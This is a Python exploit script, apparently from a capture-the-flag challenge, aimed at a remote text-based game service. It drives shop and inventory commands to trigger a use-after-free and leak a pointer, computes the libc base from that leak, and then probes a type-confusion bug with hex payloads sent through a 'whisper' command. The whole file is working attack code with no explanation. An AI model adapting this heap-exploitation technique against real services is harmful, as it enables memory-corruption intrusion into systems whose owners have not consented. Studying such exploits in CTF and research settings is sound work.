#!/usr/bin/env python3
import socket, time, re, struct, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
def connect_until_banner(tries=40):
    for i in range(tries):
        s=socket.socket(); s.settimeout(4)
        try: s.connect((HOST,PORT))
        except Exception: time.sleep(3); continue
        s.settimeout(2); b=b""
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                b+=d
                if b"Great Plateau" in b: return s,b
        except Exception: pass
        s.close(); time.sleep(3)
    return None,None
def rx(s,pats,timeout=1.5):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.03,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(s,c,pats,t=1.5):
    s.sendall(c.encode()+b"\n"); time.sleep(0.02); return rx(s,pats,t)
s,b=connect_until_banner()
if s is None: print("NO BANNER"); sys.exit(1)
# leak: 8 swords -> unsorted
for i in range(8): cmd(s,"shop buy 0 1",["tx: item added","not enough"])
cmd(s,"inv equip 8",["tx: main world equipped","invalid"])
for i in range(7): cmd(s,"shop sell 1",["shop sold","invalid"])
cmd(s,"shop sell 1",["shop sold","invalid"])
o=cmd(s,"mw show",["Drops:"])
m=re.search(r"role=None #(\d+)", o)
leak=int(m.group(1))
libc_base=leak-0x90-0x210a90
print("[leak] 0x%x [libc_base] 0x%x"%(leak,libc_base), flush=True)
# now type confusion on a fresh weapon (same session -> same arena?)
for size in [0xe0,0xe7,0xe8,0xef]:
    cmd(s,"shop buy 0 1",["tx: item added","not enough"])
    cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    payload=bytearray(b"A"*size); struct.pack_into("<Q",payload,8,2)
    o=cmd(s,"mw whisper 0 "+payload.hex(),["whispered","only","final","<EOF>"],2)
    print("size 0x%x -> %s"%(size, o.strip().splitlines()[-1][:70] if o else "?"), flush=True)
    if "whispered" in o or "final boss" in o:
        break
s.close()
